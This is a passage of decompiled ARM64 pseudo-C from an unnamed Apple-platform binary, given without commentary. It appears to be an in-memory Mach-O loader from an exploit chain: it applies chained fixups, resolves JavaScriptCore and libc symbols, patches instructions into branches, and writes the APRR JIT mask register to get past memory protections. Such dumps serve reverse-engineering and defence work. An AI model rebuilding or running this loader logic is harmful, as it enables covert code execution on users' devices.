      while ( v8 < v15 )
      {
        v38 = *v8++;
        v37 = v38;
        v39 = (unsigned __int64)(v38 & 0x7F) << v36;
        if ( v36 >= 0x40 )
          v39 = 0;
        v35 |= v39;
        v36 += 7;
        if ( (v37 & 0x80) == 0 )
          goto LABEL_113;
      }
      v35 = 0;
      v8 = v18;
LABEL_113:
      v14 += v35 + 8;
      goto LABEL_103;
    }
    v20 = sub_6760(v14, v72, BYTE4(v71), v73, v13, a3, a4, a2, v12);
    if ( (_DWORD)v20 )
      return v20;
    v14 += (unsigned int)sub_4DD4(v17, 8) + 8LL;
    goto LABEL_102;
  }
  if ( v19 != 13 )
  {
    if ( v19 == 12 )
    {
      v29 = 0;
      v30 = 0;
      v31 = v8 + 1;
      while ( v31 < v15 )
      {
        v33 = *v31++;
        v32 = v33;
        v34 = (unsigned __int64)(v33 & 0x7F) << v30;
        if ( v30 >= 0x40 )
          v34 = 0;
        v29 |= v34;
        v30 += 7;
        if ( (v32 & 0x80) == 0 )
          goto LABEL_94;
      }
      v29 = 0;
      v31 = v8 + 1;
LABEL_94:
      v70 = v11;
      v61 = 0;
      v62 = 0;
      v8 = v31;
      while ( v8 < v15 )
      {
        v64 = *v8++;
        v63 = v64;
        v65 = (unsigned __int64)(v64 & 0x7F) << v62;
        if ( v62 >= 0x40 )
          v65 = 0;
        v61 |= v65;
        v62 += 7;
        if ( (v63 & 0x80) == 0 )
        {
          if ( !v29 )
            goto LABEL_111;
          goto LABEL_108;
        }
      }
      v61 = 0;
      v8 = v31;
      if ( !v29 )
      {
LABEL_111:
        v11 = v70;
        goto LABEL_103;
      }
LABEL_108:
      v66 = v61 + 8;
      v67 = 1;
      while ( 1 )
      {
        v20 = sub_6760(v14, v72, BYTE4(v71), v73, v13, a3, a4, a2, v12);
        if ( (_DWORD)v20 )
          return v20;
        v14 += v66;
        if ( v29 <= v67++ )
          goto LABEL_111;
      }
    }
    goto LABEL_102;
  }
  if ( (_DWORD)v17 == 1 )
  {
    if ( !v11 )
      return 9502744;
    v20 = sub_651C(a2, v14, v11, (unsigned int)v71);
    ++v8;
    if ( (_DWORD)v20 )
      return v20;
    goto LABEL_103;
  }
  if ( (_DWORD)v17 )
    return 9502733;
  v55 = v11;
  v11 = 0;
  ++v8;
  while ( v8 < v15 )
  {
    v57 = *v8++;
    v56 = v57;
    v58 = (unsigned __int64)(v57 & 0x7F) << v17;
    if ( (unsigned int)v17 >= 0x40 )
      v58 = 0;
    v11 |= v58;
    LODWORD(v17) = v17 + 7;
    if ( (v56 & 0x80) == 0 )
    {
      if ( v11 >> 16 )
        return 9502735;
      if ( v55 )
        goto LABEL_86;
      goto LABEL_87;
    }
  }
  v11 = 0;
  v8 = v18;
  if ( v55 )
  {
LABEL_86:
    sub_5ADC(a4, v55, 8LL * (unsigned int)v71);
    LODWORD(v71) = 0;
  }
LABEL_87:
  if ( !v11 )
  {
    v14 = 0;
    goto LABEL_103;
  }
  v59 = sub_5B4C(a4, 8 * v11, 0);
  if ( v59 )
  {
    v14 = v59;
    sub_4B68(v59, 0, 8 * v11);
    v60 = v11;
    v11 = v14;
    LODWORD(v71) = v60;
    goto LABEL_103;
  }
  return 708617;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5480
// Address:  0x5480  Size: 124 bytes
// Calls:    sub_5C
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5480(__int64 result, int *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // x8
  unsigned int v4; // w9

  if ( a2 && a3 >= 4 )
  {
    v3 = a3 >> 2;
    v4 = result - (_DWORD)a2;
    do
    {
      if ( *a2 == -685831663 || *a2 == -702610944 )
        *a2 = (v4 >> 2) & 0x3FFFFFF | 0x14000000;
      ++a2;
      v4 -= 4;
      --v3;
    }
    while ( v3 );
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_54FC
// Address:  0x54FC  Size: 1504 bytes
// Calls:    sub_7028, sub_10EC, sub_4A24, sub_FF8, sub_F50, sub_EF8, sub_1054, sub_5C, sub_13A0, sub_4B68, sub_BC, sub_1330, sub_4E00, sub_1314
// Xrefs:    3 callers
// Strings:  "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", "JSEvaluateScript", "/usr/lib/system/libsystem_c.dylib", "sigaction"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_54FC(__int64 a1, __int64 a2)
{
  __int64 v2; // x22
  __int64 v4; // x20
  unsigned __int64 v5; // x21
  __int64 v6; // x23
  __int64 v7; // x0
  __int64 v8; // x26
  unsigned int v9; // w21
  __int64 v10; // x0
  unsigned __int64 v11; // x23
  unsigned __int64 v12; // x0
  __int64 v14; // x0
  _DWORD *v15; // x22
  __int64 v16; // x0
  __int64 v17; // x3
  unsigned __int64 v18; // x8
  _DWORD *v19; // x9
  int v20; // w10
  unsigned int v21; // w8
  unsigned int v22; // w8
  unsigned int v23; // w8
  unsigned __int64 v24; // x23
  __int64 v25; // x8
  int v26; // w22
  _DWORD *v27; // x2
  __int64 v28; // x28
  __int64 v30; // x24
  __int64 v31; // x0
  _QWORD *v32; // x21
  int v33; // w8
  __int64 v34; // x22
  int v35; // w20
  unsigned __int64 v36; // x28
  __int64 v37; // x0
  __int64 v38; // x3
  __int64 v39; // x3
  unsigned __int16 v40; // w8
  __int64 v41; // x21
  int v42; // w20
  __int64 v43; // x8
  __int64 v44; // x9
  unsigned __int64 v45; // x24
  __int64 v46; // x8
  __int64 v47; // x25
  int v48; // w20
  unsigned int v49; // w19
  unsigned __int64 v50; // [xsp+0h] [xbp-A0h]
  __int64 v51; // [xsp+8h] [xbp-98h]
  __int64 v52; // [xsp+10h] [xbp-90h]
  _QWORD v53[2]; // [xsp+18h] [xbp-88h] BYREF
  __int64 v54; // [xsp+28h] [xbp-78h] BYREF
  __int64 v55; // [xsp+30h] [xbp-70h]
  unsigned __int64 v56; // [xsp+38h] [xbp-68h] BYREF

  v2 = 708609;
  if ( !a1 || !a2 )
    return v2;
  if ( !*(_BYTE *)(a2 + 1479) )
    return 0;
  v4 = *(_QWORD *)(a2 + 1496);
  if ( !v4 || !*(_QWORD *)(a2 + 1488) )
    return v2;
  v5 = *(unsigned int *)(a1 + 168);
  v6 = *(_QWORD *)(a1 + 88);
  v53[0] = 0;
  v7 = sub_7028(a2, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", "JSEvaluateScript", v53);
  if ( (_DWORD)v7 )
    return v7;
  v50 = v5;
  v8 = 0;
  v9 = 0;
  v51 = v6 - v4;
  v54 = loc_75D8;
  LODWORD(v55) = loc_75E0;
  while ( 1 )
  {
    sub_10EC();
    v11 = v10 + 12582912;
    sub_10EC();
    if ( v12 < v11 && v12 != 0 )
      break;
LABEL_34:
    if ( ++v8 == 3 )
    {
      if ( v9 )
        return v9;
      else
        return 86022;
    }
  }
  while ( 1 )
  {
    v14 = sub_4A24(v12, v11 - v12, (__int64)&v54 + 4 * v8, 4u);
    if ( !v14 )
    {
LABEL_33:
      v9 = 86020;
      goto LABEL_34;
    }
    v15 = (_DWORD *)v14;
    v56 = 0xF2982188B2704FE8LL;
    v16 = sub_4A24(v14, 4096, (__int64)&v56, 8u);
    if ( v16 )
      break;
LABEL_31:
    v12 = (unsigned __int64)(v15 + 1);
    if ( (unsigned __int64)(v15 + 1) >= v11 || v15 == (_DWORD *)-4LL )
      goto LABEL_33;
  }
  if ( !v8 )
  {
    v30 = v16;
    v56 = 0;
    v2 = sub_7028(a2, "/usr/lib/system/libsystem_c.dylib", "sigaction", &v56);
    if ( (_DWORD)v2 )
      return v2;
    v31 = sub_13A0();
    if ( v31 == -1 )
      return 86017;
    v32 = (_QWORD *)v31;
    v33 = *(_DWORD *)(a2 + 224);
    if ( v33 == -2023363094 || v33 == -634136515 || v33 == 678884789 )
    {
      v34 = 11;
      v35 = 1;
      v36 = v50;
    }
    else
    {
      v36 = v50;
      if ( (unsigned int)sub_1330() )
      {
        v40 = -32767;
        goto LABEL_71;
      }
      v35 = 0;
      v34 = 10;
    }
    sub_4B68((__int64)&v54, 0, 0x10u);
    sub_BC();
    v54 = v37;
    v55 = 0x4000000000LL;
    if ( !(unsigned int)sub_5C(v34, (__int64)&v54, (__int64)v53, v38) )
    {
      v43 = 4919;
      if ( v35 )
        v43 = 4921;
      v52 = v43;
      if ( (v35 & 1) != 0 )
        v44 = 0;
      else
        v44 = *(_QWORD *)(a2 + 1488);
      v32[102] = v30;
      v32[103] = *(_QWORD *)(a2 + 1488);
      if ( (_DWORD)v36 )
      {
        v45 = 0;
        v46 = *(_QWORD *)(a2 + 1488);
        v47 = v44 + v51;
        while ( 1 )
        {
          v48 = *(_DWORD *)(*(_QWORD *)(a2 + 1496) + v51 + v45);
          if ( v48 != *(_DWORD *)(v46 + v51 + v45) )
          {
            sub_4E00(*(unsigned int *)(*(_QWORD *)(a2 + 1496) + v51 + v45), (_DWORD *)(v47 + v45), v52, v32);
            v46 = *(_QWORD *)(a2 + 1488);
            if ( v48 != *(_DWORD *)(v46 + v51 + v45) )
              break;
          }
          v45 += 4LL;
          if ( v45 >= v36 )
            goto LABEL_78;
        }
        v49 = 86021;
      }
      else
      {
LABEL_78:
        v49 = 0;
      }
      if ( (unsigned int)sub_5C(v34, (__int64)v53, 0, v39) )
        v2 = 86019;
      else
        v2 = v49;
LABEL_84:
      sub_1314();
      return v2;
    }
    v40 = -32766;
LABEL_71:
    v2 = (v40 | 0xFFF60000) + 708609;
    goto LABEL_84;
  }
  v18 = 0;
  v19 = v15;
  while ( 1 )
  {
    v20 = *(v19 - 1);
    if ( v20 != -788446209 )
    {
      if ( v20 == -788462593 )
      {
        if ( *v19 == -1459529738 )
        {
          v41 = 0;
          v42 = 1;
          goto LABEL_39;
        }
        if ( *v19 == -1459466252 )
        {
          v21 = v15[2];
          if ( (v21 & 0xFFC001E0) != 0xB90001E0 )
            goto LABEL_31;
          v41 = (v21 >> 8) & 0x3FFC;
          v42 = 4;
          goto LABEL_39;
        }
      }
      goto LABEL_24;
    }
    if ( *v19 == -1459464202 )
    {
      v22 = v15[2];
      if ( (v22 & 0xFFC001E0) != 0xB90001E0 )
        goto LABEL_31;
      v41 = (v22 >> 8) & 0x3FFC;
      v42 = 3;
      goto LABEL_39;
    }
    if ( *v19 == -1459527688 )
      break;
LABEL_24:
    v18 += 4LL;
    --v19;
    if ( v18 >= 0xED )
      goto LABEL_31;
  }
  v23 = v15[2];
  if ( (v23 & 0xFFC001E0) != 0xB90001E0 )
    goto LABEL_31;
  v41 = (v23 >> 8) & 0x3FFC;
  v42 = 2;
LABEL_39:
  if ( !(_DWORD)v50 )
    return 0;
  v24 = 0;
  v25 = *(_QWORD *)(a2 + 1488);
  while ( 1 )
  {
    v26 = *(_DWORD *)(*(_QWORD *)(a2 + 1496) + v51 + v24);
    v27 = (_DWORD *)(v25 + v51 + v24);
    if ( v26 != *v27 )
    {
      if ( v42 > 2 )
      {
        v28 = v16;
        if ( v42 == 3 )
          sub_1054(v16, *(unsigned int *)(*(_QWORD *)(a2 + 1496) + v51 + v24), (__int64)v27, v41);
        else
          sub_F50(v16, *(unsigned int *)(*(_QWORD *)(a2 + 1496) + v51 + v24), (__int64)v27, v41);
      }
      else
      {
        v28 = v16;
        if ( v42 == 1 )
          sub_EF8(v16, *(unsigned int *)(*(_QWORD *)(a2 + 1496) + v51 + v24), (__int64)v27, v17);
        else
          sub_FF8(v16, *(unsigned int *)(*(_QWORD *)(a2 + 1496) + v51 + v24), (__int64)v27, v41);
      }
      v16 = v28;
      v25 = *(_QWORD *)(a2 + 1488);
      if ( v26 != *(_DWORD *)(v25 + v51 + v24) )
        break;
    }
    v2 = 0;
    v24 += 4LL;
    if ( v24 >= v50 )
      return v2;
  }
  return 86021;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5ADC
// Address:  0x5ADC  Size: 112 bytes
// Calls:    sub_5C74, sub_5C
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5ADC(__int64 result, __int64 a2, __int64 a3, __int64 a4)
{
  if ( *(_BYTE *)(result + 1477) )
    return sub_5C74(result, a2);
  if ( *(_QWORD *)(result + 176) )
    return sub_5C(result, a2, a3, a4);
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5B4C
// Address:  0x5B4C  Size: 296 bytes
// Calls:    sub_5C, sub_5C74
// Xrefs:    5 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5B4C(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v6; // x23
  __int64 v7; // x0
  __int64 v8; // x2
  __int64 v9; // x3
  unsigned __int64 v10; // x22

  v6 = a2;
  if ( !*(_BYTE *)(a1 + 1474) )
  {
    if ( (a3 & 1) != 0 || (v6 = a2, *(_BYTE *)(a1 + 1477)) )
      v6 = a2 + 0x4000;
  }
  while ( 1 )
  {
    v7 = sub_5C(a1, v6, a3, a4);
    if ( v7 )
      break;
    if ( !*(_QWORD *)(a1 + 296) || (unsigned int)sub_5C(a1, v6, v8, v9) )
      return a3 << 63 >> 63;
  }
  v10 = v7;
  if ( !*(_BYTE *)(a1 + 1474) )
  {
    if ( (a3 & 1) != 0 )
    {
      if ( (v7 & 0x3FFF) == 0 )
        goto LABEL_16;
    }
    else if ( !*(_BYTE *)(a1 + 1477) || (v7 & 0x3FFF) == 0 )
    {
LABEL_16:
      if ( *(_BYTE *)(a1 + 1477) && (unsigned int)sub_5C74(a1, v10) )
        return a3 << 63 >> 63;
      return v10;
    }
    v10 = (v7 + 0x4000) & 0xFFFFFFFFFFFFC000LL;
    goto LABEL_16;
  }
  return v10;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5C74
// Address:  0x5C74  Size: 128 bytes
// Calls:    sub_1330, sub_5C
// Xrefs:    8 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5C74(_BYTE *a1, __int64 a2, __int64 a3, char a4)
{
  __int64 result; // x0

  if ( a1[1477] )
    return sub_1330();
  if ( !a1[1473] || a1[1476] )
    return 0;
  result = 0;
  if ( !a1[1479] && (a4 & 4) == 0 )
    return sub_1330();
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5CF4
// Address:  0x5CF4  Size: 284 bytes
// Calls:    sub_4CB4, sub_5C
// Xrefs:    2 callers
// Strings:  "__PAGEZERO"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5CF4(_QWORD *a1, unsigned __int64 a2, _QWORD *a3)
{
  __int64 result; // x0
  int v7; // w23
  __int64 v8; // x24
  __int64 v9; // x25
  unsigned __int64 v10; // x8
  unsigned __int64 v11; // x8

  result = 708609;
  if ( a1 && a3 )
  {
    if ( *(_DWORD *)(*a1 + 16LL) )
    {
      v7 = 0;
      v8 = a1[11] - a1[10];
      v9 = a1[13] + 32LL;
      while ( 1 )
      {
        if ( *(_DWORD *)v9 == 25 )
        {
          if ( *(_QWORD *)(v9 + 48) )
          {
            if ( (unsigned int)sub_4CB4(v9 + 8, (__int64)"__PAGEZERO", 0xBu) )
            {
              v10 = *(_QWORD *)(v9 + 40);
              if ( v10 <= a2 )
              {
                v11 = a2 - v10;
                if ( v11 < *(_QWORD *)(v9 + 48) )
                  break;
              }
            }
          }
        }
        v9 += *(unsigned int *)(v9 + 4);
        if ( (unsigned int)++v7 >= *(_DWORD *)(*a1 + 16LL) )
          return 708625;
      }
      *a3 = v8 + v11 + *(_QWORD *)(v9 + 24);
      return 0;
    }
    else
    {
      return 708625;
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5E10
// Address:  0x5E10  Size: 472 bytes
// Calls:    sub_5FE8, sub_5C, sub_4C18
// Xrefs:    3 callers
// Strings:  "/usr/lib/system/libcache.dylib", "dyld_stub_binder", "__objc_empty_vtable", "_objc_readClassPair"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5E10(char *a1, __int64 a2, __int64 a3, __int64 *a4, int a5)
{
  __int64 v8; // x0
  __int64 result; // x0
  __int64 v10; // x0
  __int64 v11; // x23
  int v12; // w24
  __int64 v13; // x1
  __int64 v14; // x2
  __int64 v15; // x3
  unsigned int v16; // w8
  unsigned int v17; // w9
  unsigned int v18; // w23
  BOOL v19; // w24
  __int64 v20; // x0
  __int64 v21; // x8
  __int64 v22; // [xsp+8h] [xbp-38h]

  if ( a1 && a2 && a3 && a4 && a5 && a5 != -2 )
  {
    if ( a5 == -1 )
    {
      v8 = -5;
    }
    else
    {
      if ( a5 < 1 )
        goto LABEL_14;
      if ( *(_DWORD *)(a2 + 512) < (unsigned int)a5 )
        goto LABEL_14;
      v8 = *(_QWORD *)(a2 + 8LL * (unsigned int)(a5 - 1));
      if ( !v8 )
        goto LABEL_14;
    }
    result = sub_5FE8(v8);
    if ( !(_DWORD)result )
      return result;
  }
LABEL_14:
  v10 = sub_5C((__int64)"/usr/lib/system/libcache.dylib", 18, a3, (__int64)a4);
  if ( v10 )
  {
    v11 = v10;
    v12 = sub_5FE8(v10);
    sub_5C(v11, v13, v14, v15);
    if ( !v12 )
    {
LABEL_34:
      v21 = v22;
      goto LABEL_35;
    }
  }
  v16 = *(_DWORD *)(a2 + 516);
  v17 = *(_DWORD *)(a2 + 512);
  if ( v16 >= v17 )
    v18 = 0;
  else
    v18 = *(_DWORD *)(a2 + 516);
  if ( v18 < v17 )
  {
    v19 = v16 < v17;
    while ( 1 )
    {
      v20 = *(_QWORD *)(a2 + 8LL * v18);
      if ( v20 )
      {
        if ( !(unsigned int)sub_5FE8(v20) )
          break;
      }
      if ( v19 )
      {
        v18 = v18 == 0;
        *(_DWORD *)(a2 + 516) = 0;
      }
      else
      {
        ++v18;
      }
      v19 = 0;
      if ( v18 >= *(_DWORD *)(a2 + 512) )
        goto LABEL_27;
    }
    *(_DWORD *)(a2 + 516) = v18;
    goto LABEL_34;
  }
LABEL_27:
  if ( (unsigned int)sub_4C18(a1, "dyld_stub_binder") )
  {
    if ( (unsigned int)sub_4C18(a1, "__objc_empty_vtable") && (unsigned int)sub_4C18(a1, "_objc_readClassPair") )
      return 9502726;
    v21 = 0;
  }
  else
  {
    v21 = 3735928559LL;
  }
LABEL_35:
  *a4 = v21;
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5FE8
// Address:  0x5FE8  Size: 428 bytes
// Calls:    sub_5C, sub_4C18, sub_10EC
// Xrefs:    4 callers
// Strings:  "_pthread_create", "/usr/lib/system/libsystem_pthread.dylib", "pthread_create", "/usr/lib/system/libsystem_c.dylib", "malloc", "free"
////////////////////////////////////////////////////////////////////////

// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_5FE8(__int64 a1, char *a2, __int64 a3, __int64 *a4)
{
  __int64 v8; // x2
  __int64 v9; // x3
  __int64 v10; // x1
  __int64 v11; // x0
  __int64 v12; // x21
  __int64 v13; // x1
  __int64 v14; // x2
  __int64 v15; // x3
  __int64 v17; // x0
  __int64 v18; // x2
  __int64 v19; // x3
  __int64 v20; // x0
  __int64 v21; // x2
  __int64 v22; // x3
  __int64 v23; // x21
  __int64 v24; // x0
  __int64 v25; // x2
  __int64 v26; // x3
  __int64 v27; // x22
  __int64 v28; // x0
  __int64 v29; // x2
  __int64 v30; // x3
  __int64 v31; // x23
  __int64 v32; // x0

  sub_5C(a1, (__int64)a2, a3, (__int64)a4);
  if ( *(_BYTE *)(a3 + 1472) && !(unsigned int)sub_4C18(a2, "_pthread_create") )
  {
    v17 = sub_5C((__int64)"/usr/lib/system/libsystem_pthread.dylib", 16, v8, v9);
    if ( v17 )
    {
      sub_5C(v17, (__int64)"pthread_create", v18, v19);
      sub_10EC();
      if ( v20 )
      {
        v23 = v20;
        v24 = sub_5C((__int64)"/usr/lib/system/libsystem_c.dylib", 16, v21, v22);
        if ( v24 )
        {
          v27 = v24;
          sub_5C(v24, (__int64)"malloc", v25, v26);
          sub_10EC();
          if ( v28 )
          {
            v31 = v28;
            sub_5C(v27, (__int64)"free", v29, v30);
            sub_10EC();
            if ( v32 )
            {
              loc_7518 = v23;
              unk_7520 = v31;
              qword_7528 = v32;
              *a4 = (__int64)sub_6194;
              return 0;
            }
          }
        }
      }
    }
    *a4 = 0;
  }
  else
  {
    if ( *a2 == 95 )
      v10 = (__int64)(a2 + 1);
    else
      v10 = (__int64)a2;
    sub_5C(a1, v10, v8, v9);
    sub_10EC();
    v12 = v11;
    sub_5C(v11, v13, v14, v15);
    *a4 = v12;
    if ( v12 )
      return 0;
  }
  return 9502726;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6194
// Address:  0x6194  Size: 252 bytes
// Calls:    sub_5C, sub_BC, sub_4B68
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_6194()
{
  return 22;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6290
// Address:  0x6290  Size: 176 bytes
// Calls:    sub_10EC, sub_5C, sub_4B68
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6290(_QWORD *a1)
{
  __int64 v2; // x0
  __int64 v3; // x1
  __int64 v4; // x2
  __int64 v5; // x3
  __int64 v6; // x20

  if ( !a1 || !*a1 )
    return 0;
  _WriteStatusReg(APRR_JIT_MASK_EL2, 0);
  __isb(0xFu);
  sub_10EC();
  *a1 = v2;
  v6 = sub_5C(a1[1], v3, v4, v5);
  sub_4B68((__int64)a1, 0, 0x10u);
  return v6;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6340
// Address:  0x6340  Size: 476 bytes
// Calls:    sub_5CF4, sub_5C, sub_651C, sub_4994
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6340(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        int a5,
        unsigned int a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        unsigned __int64 a10,
        unsigned __int64 a11,
        unsigned __int64 a12)
{
  __int64 v12; // x21
  __int64 v17; // x0
  __int64 v19; // x24
  int v20; // w25
  unsigned __int64 v21; // x23
  unsigned __int64 v22; // x8
  unsigned __int64 v23; // x8
  __int64 v24; // x9
  unsigned __int64 v25; // x8
  __int64 v26; // x8
  unsigned __int64 v27; // x8
  __int64 v29[3]; // [xsp+8h] [xbp-58h] BYREF

  v12 = 708609;
  if ( a1 && a4 )
  {
    v29[0] = 0;
    v17 = sub_5CF4((_QWORD *)a1, *(_QWORD *)(a4 + 8) + a6 + (unsigned int)*(unsigned __int16 *)(a4 + 4) * a5, v29);
    if ( !(_DWORD)v17 )
    {
      v19 = 9568262;
      v20 = *(unsigned __int16 *)(a4 + 6);
      if ( v20 == 6 || v20 == 2 )
      {
        v21 = a10;
        v17 = 708609;
        if ( a10 )
        {
          a12 = 0;
          v22 = *(_QWORD *)(a1 + 88);
          if ( v22 <= a10 && v22 + *(unsigned int *)(a1 + 168) > a10 )
          {
            do
            {
              sub_4994((__int64)&a11, v21, 8u);
              if ( (a11 & 0x8000000000000000LL) != 0 )
              {
                if ( (a11 & 0xFFFFFF) >= (unsigned int)a3 )
                  return 9568257;
                v25 = *(_QWORD *)(a2 + 8 * (a11 & 0xFFFFFF)) + BYTE3(a11);
              }
              else
              {
                v23 = a11 & 0xFFFFFFFFFLL | ((unsigned __int64)(unsigned __int8)(a11 >> 36) << 56);
                v24 = *(_QWORD *)(a1 + 96);
                if ( v20 == 2 )
                  v25 = v23 + v24 - *(_QWORD *)(a1 + 80);
                else
                  v25 = v23 + v24;
              }
              a12 = v25;
              sub_4994(v21, (__int64)&a12, 8u);
              v26 = (a11 >> 51) & 0xFFF;
              if ( !(_DWORD)v26 )
                return 0;
              v21 += (unsigned int)(4 * v26);
              a12 = 0;
              v27 = *(_QWORD *)(a1 + 88);
            }
            while ( v21 >= v27 && v27 + *(unsigned int *)(a1 + 168) > v21 );
          }
          return v19;
        }
      }
      else if ( v20 == 1 )
      {
        return sub_651C(a1, a10, a2, a3);
      }
      else
      {
        return 9568261;
      }
    }
    return v17;
  }
  return v12;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_651C
// Address:  0x651C  Size: 300 bytes
// Calls:    sub_6648, sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_651C(__int64 a1, unsigned __int64 *a2, __int64 a3, unsigned int a4)
{
  __int64 v8; // x19
  unsigned __int64 v9; // x24
  __int64 v10; // x9
  unsigned __int64 v11; // x0
  unsigned __int64 v12; // x9

  v8 = 9568257;
  while ( 1 )
  {
    v9 = *a2;
    v10 = *(_QWORD *)(a1 + 96);
    if ( (*a2 & 0x8000000000000000LL) != 0 )
    {
      if ( (v9 & 0x4000000000000000LL) == 0 )
      {
        v11 = v10 + (unsigned int)v9;
LABEL_13:
        v11 = sub_6648(v11);
        goto LABEL_14;
      }
      if ( a4 <= (unsigned __int16)v9 )
        return v8;
      v11 = *(_QWORD *)(a3 + 8LL * (unsigned __int16)*a2);
      if ( v11 )
        goto LABEL_13;
    }
    else if ( (v9 & 0x4000000000000000LL) != 0 )
    {
      if ( a4 <= (unsigned __int16)v9 )
        return v8;
      v12 = HIDWORD(v9) | 0xFFFFFFFFFFFC0000LL;
      if ( (v9 & 0x40000) == 0 )
        v12 = HIDWORD(v9) & 0x7FFFF;
      v11 = *(_QWORD *)(a3 + 8LL * (unsigned __int16)*a2) + v12;
    }
    else
    {
      v11 = ((v9 << 13) & 0xFF00000000000000LL)
          + v10
          + (((__int64)(v9 << 21) >> 21) & 0xFFFFFFFFFFFFFFLL)
          - *(_QWORD *)(a1 + 80);
    }
LABEL_14:
    *a2 = v11;
    if ( ((v9 >> 51) & 0x7FF) == 0 )
      return 0;
    a2 += (v9 >> 51) & 0x7FF;
  }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6648
// Address:  0x6648  Size: 116 bytes
// Calls:    sub_BC, sub_134, sub_F8, sub_170, sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void __fastcall sub_6648(__int64 a1, int a2)
{
  if ( a2 == 2 )
  {
    sub_134();
  }
  else if ( a2 == 1 )
  {
    sub_F8();
  }
  else if ( a2 )
  {
    sub_170();
  }
  else
  {
    sub_BC();
  }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_66BC
// Address:  0x66BC  Size: 164 bytes
// Calls:    sub_5C
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_66BC(int a1, _QWORD *a2)
{
  int v2; // w8
  int v3; // w9
  __int64 v4; // x10

  v2 = *(_DWORD *)(*a2 + 16LL);
  if ( !v2 )
    return 0;
  v3 = 0;
  v4 = a2[13] + 32LL;
  while ( *(_DWORD *)v4 != 25 )
  {
LABEL_6:
    v4 += *(unsigned int *)(v4 + 4);
    if ( !--v2 )
      return 0;
  }
  if ( v3 != a1 )
  {
    ++v3;
    goto LABEL_6;
  }
  return a2[11] - a2[10] + *(_QWORD *)(v4 + 24);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6760
// Address:  0x6760  Size: 380 bytes
// Calls:    sub_5E10, sub_68DC, sub_10EC, sub_5C
// Xrefs:    5 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6760(
        _QWORD *a1,
        char *a2,
        char a3,
        int a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        int a9)
{
  int v14; // w26
  __int64 result; // x0
  char v17; // w8
  __int64 v18; // x0
  unsigned __int64 v19; // x8
  int v20; // w8
  __int64 v21; // [xsp+0h] [xbp-50h]
  __int64 v22; // [xsp+8h] [xbp-48h] BYREF

  v22 = 0;
  if ( !a2 )
    return 9502732;
  v14 = a3 & 1;
  result = sub_5E10(a2, a6, a7, &v22, a9);
  if ( (_DWORD)result != 9502726 || v14 == 0 )
  {
    if ( (_DWORD)result )
      return result;
  }
  else
  {
    a5 = 0;
    v22 = 0;
  }
  if ( !(unsigned int)sub_68DC(a2) )
  {
    a5 = 0;
    v22 = v21;
  }
  v17 = *(_BYTE *)(a8 + 172);
  if ( (v17 & 0x40) != 0 )
  {
    sub_10EC();
    v22 = v18;
    v17 = *(_BYTE *)(a8 + 172);
  }
  if ( (v17 & 0x40) != 0
    || (v19 = *(_QWORD *)(a8 + 88), result = 9502727, v19 <= (unsigned __int64)a1)
    && v19 + *(unsigned int *)(a8 + 168) > (unsigned __int64)a1 )
  {
    if ( a4 == 3 )
    {
      result = 0;
      v20 = a5 + v22 - (_DWORD)a1 - 4;
    }
    else
    {
      if ( a4 != 2 )
      {
        if ( a4 == 1 )
          *a1 = a5 + v22;
        return 0;
      }
      result = 0;
      v20 = a5 + v22;
    }
    *(_DWORD *)a1 = v20;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_68DC
// Address:  0x68DC  Size: 928 bytes
// Calls:    sub_4C18, sub_5C, sub_10EC, sub_4CB4
// Xrefs:    3 callers
// Strings:  "_asl_vlog", "_asl_log", "/usr/lib/system/libsystem_trace.dylib", "_os_log_actual", "_os_log_internal", "_os_log_default", "/usr/lib/system/libsystem_c.dylib", "vasprintf", "_NSGetMachExecuteHeader", "free"
////////////////////////////////////////////////////////////////////////

// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_68DC(
        char *a1,
        __int64 a2,
        __int64 (__fastcall **a3)(int, int, int, int, int, int, int, int, char))
{
  __int64 v5; // x2
  __int64 v6; // x3
  __int64 v7; // x20
  __int64 (__fastcall *v8)(int, int, int, int, int, int, int, int, char); // x28
  __int64 v9; // x0
  __int64 v10; // x2
  __int64 v11; // x3
  __int64 v12; // x22
  __int64 v13; // x1
  __int64 v14; // x2
  __int64 v15; // x3
  __int64 v16; // x0
  __int64 v17; // x0
  __int64 v18; // x24
